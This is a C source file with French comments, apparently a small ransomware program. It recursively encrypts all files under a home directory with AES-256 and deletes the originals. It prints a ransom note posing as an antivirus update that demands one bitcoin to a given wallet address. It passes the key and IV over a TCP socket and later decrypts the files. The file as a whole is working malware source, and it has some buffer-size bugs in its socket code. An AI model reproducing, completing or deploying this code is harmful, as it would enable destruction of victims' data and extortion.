#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <unistd.h>
#include <arpa/inet.h>

int chdir(const char *path);

int read_encrypt(char *repertory,int depth);
int read_decrypt(char *repertory,int depth);

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext);
int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv, unsigned char *plaintext);

int send_key_iv(unsigned char *key, unsigned char *iv);
int receive_key_iv(unsigned char *recup_key, unsigned char *recup_iv);

void handleErrors(void);

unsigned char key[32];
unsigned char iv[16];

unsigned char recup_key[32];
unsigned char recup_iv[16];

int main(int argc, char argv[])
{
    //Génération de la clef et de l'IV
    
    RAND_bytes(key,sizeof(key));
    RAND_bytes(iv,sizeof(iv));
    
    //Appel de la fonction de chiffrement
    read_encrypt("/home/test/",0);

    printf("\nLA BASE VIRALE VPS A ETE MISE A JOUR\n");
    printf("\nVérification dans 15 secondes,si le paiement n'est pas fait, tout sera perdu\n");
    printf("\nVeuillez payer 1 bitcoin sur le compte 1GyWgXtkVG5gsm9Ym1rkHoJHAftmPnTHQj\n");

    send_key_iv(key,iv);

    // On vide la clef et l'IV en mettant des 0 dans les tableaux
    for (int i = 0; i < sizeof(key); i++)
    {
        key[i] = 0;
    }
    for (int i = 0; i < sizeof(iv); i++)
    {
        iv[i] = 0;
    }

    // On attend 15 secondes
    sleep(15);
    
    // On récupère la clef et l'IV via la fonction receive_key_iv
    receive_key_iv(recup_key, recup_iv);
    printf("\nVous avez reçu les nécessaires");

    // On appelle la fonction de déchiffrement
    read_decrypt("/home/test",0);

    sleep(5);

    printf("\nTout est remis en ordre, ... \nGoodbye");
            
}


int read_encrypt(char *repertory_enc, int depth_enc)
{
    // On ouvre le répertoire
    DIR *dp_enc;
    struct dirent *entry_enc;
    struct stat file_type;

    // On vérifie que le répertoire existe
    if ((dp_enc = opendir(repertory_enc)) == NULL)
    {
        perror("opendir");
        return -1;
    }

    // On se place dans le répertoire
    chdir(repertory_enc);

    // On parcourt le répertoire
    while ((entry_enc = readdir(dp_enc)) != NULL)
    {
        lstat(entry_enc->d_name, &file_type);
        
        // On vérifie que ce n'est pas un répertoire
        if (S_ISDIR(file_type.st_mode))
        {
            if (strcmp(".", entry_enc->d_name) == 0 || strcmp("..", entry_enc->d_name) == 0)
                continue;
            read_encrypt(entry_enc->d_name, depth_enc + 4);
        }
        
        // Sinon on chiffre le fichier
        else
        {
            // On récupère le nom du fichier
            char *filename_enc = entry_enc->d_name;
            FILE *input_enc = fopen(filename_enc, "rb");

            if (!input_enc)
            {
                fprintf(stderr, "Error opening input file: %s\n", filename_enc);
                return 1;
            }

            if (!S_ISDIR(file_type.st_mode))
            {
                char output_filename[128];
                sprintf(output_filename, "%s.encr", filename_enc);

                FILE *output_enc = fopen(output_filename, "wb");
                if (!output_enc)
                {
                    fprintf(stderr, "Error opening output file: %s\n", filename_enc);
                    return 1;
                }
                unsigned char enc_buf[8];
                unsigned char out_enc[16];
                
                // On chiffre le fichier grâce à la fonction encrypt appellée dans un while afin de lire le fichier par morceaux de 8 octets
                int count = fread(enc_buf, 1, sizeof(enc_buf), input_enc);
                while (count > 0){
                    int encrbuffer = encrypt(enc_buf, count, key, iv, out_enc);
                    fwrite(out_enc, 1, encrbuffer, output_enc); 
                    count = fread(enc_buf, 1, sizeof(enc_buf), input_enc);
                }

                fclose(input_enc);
                fclose(output_enc);
                
                remove(filename_enc);
            }
        }
    }
    chdir("..");
    closedir(dp_enc);
    return 0;
}


int read_decrypt(char *repertory, int depth)
{
    DIR *dp_dec;
    struct dirent *entry_dec;
    struct stat file_type;

    if ((dp_dec = opendir(repertory)) == NULL)
    {
        perror("opendir");
        return -1;
    }

    chdir(repertory);

    while ((entry_dec = readdir(dp_dec)) != NULL)
    {
        lstat(entry_dec->d_name, &file_type);

        if (S_ISDIR(file_type.st_mode))
        {
            if (strcmp(".", entry_dec->d_name) == 0 || strcmp("..", entry_dec->d_name) == 0)
                continue;
            read_decrypt(entry_dec->d_name, depth + 4);
        }
        else
        {
            char *filename_dec = entry_dec->d_name;
            char *suffix = ".encr";
            if (strstr(filename_dec, suffix) == NULL)
            {
                continue;
            }

            FILE *input_dec = fopen(filename_dec, "rb");
            if (!input_dec)
            {
                fprintf(stderr, "Error opening input file: %s\n", filename_dec);
                return 1;
            }
            
            char output_filename[128];
            char *p = strstr(filename_dec, suffix);
            int suffix_len = strlen(suffix);
            int filename_len = p - filename_dec;

            strncpy(output_filename, filename_dec, filename_len);
            output_filename[filename_len] = '\0';

            FILE *output_dec = fopen(output_filename, "wb");
            if (!output_dec)
            {
                fprintf(stderr, "Error opening output file: %s\n", filename_dec);
                return 1;
            }

            unsigned char dec_buf[16];
            unsigned char out_dec[8];
        
            int count2 = fread(dec_buf, 1, sizeof(dec_buf), input_dec);
            while (count2 > 0){
                int decrbuffer = decrypt(dec_buf, count2, recup_key, recup_iv, out_dec);
                fwrite(out_dec, 1, decrbuffer, output_dec);
                count2 = fread(dec_buf, 1, sizeof(dec_buf), input_dec);
            }

            fclose(input_dec);
            fclose(output_dec);
            remove(filename_dec);
        }
        
    }
        chdir("..");
        closedir(dp_dec);
        return 0;
        
}


int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len=16;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

void handleErrors(void)
{
    // Ceci est une fonction qui permet d'afficher les erreurs
    ERR_print_errors_fp(stderr);
    abort();
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

int send_key_iv(unsigned char *key, unsigned char *iv)
{
    // On crée un socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket() failed");
        exit(1);
    }

    // On définit le protocole, l'adresse du serveur et un port
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(12345);

    // On bind le socket avec la structure
    if (bind(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        perror("bind() failed");
        exit(1);
    }

    printf("\nListening ............................\n");

    // On écoute le socket
    if (listen(sockfd, 5) < 0) {
        perror("listen() failed");
        exit(1);
    }

    // On accepte la connexion
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    int client_sockfd = accept(sockfd, (struct sockaddr*) &client_addr, &client_addr_len);
    if (client_sockfd < 0) {
        perror("accept() failed");
        exit(1);
    }

    // On envoie la clé et l'iv
    if (send(client_sockfd, key, 128, 0) < 0 || send(client_sockfd, iv, 64, 0) < 0) {
        perror("send() failed");
        exit(1);
    }
    

    // On ferme le socket
    close(sockfd);

    return 0;
}

int receive_key_iv(unsigned char *recup_key, unsigned char *recup_iv)
{
    // On crée un socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket() failed");
        exit(1);
    }

    // On définit le protocole, l'adresse du serveur et un port
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.1");
    server_addr.sin_port = htons(12345);

    // On connecte le socket avec la structure
    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        perror("connect() failed");
        exit(1);
    }

    // On reçoit la clé et l'IV

    if (recv(sockfd, recup_key, 128, 0) < 0 || recv(sockfd, recup_iv, 64, 0) < 0) {
        perror("recv() failed");
        exit(1);
    }

    // On affiche la clé et l'IV
    printf("\nReceived key: ");
    for (int i = 0; i < 32; i++) {
        printf("%02x", recup_key[i]);
    }
    printf("\nReceived IV: ");
    for (int i = 0; i < 16; i++) {
        printf("%02x", recup_iv[i]);
    }
    printf("\n");

    // On ferme le socket
    close(sockfd);

    return 0;
}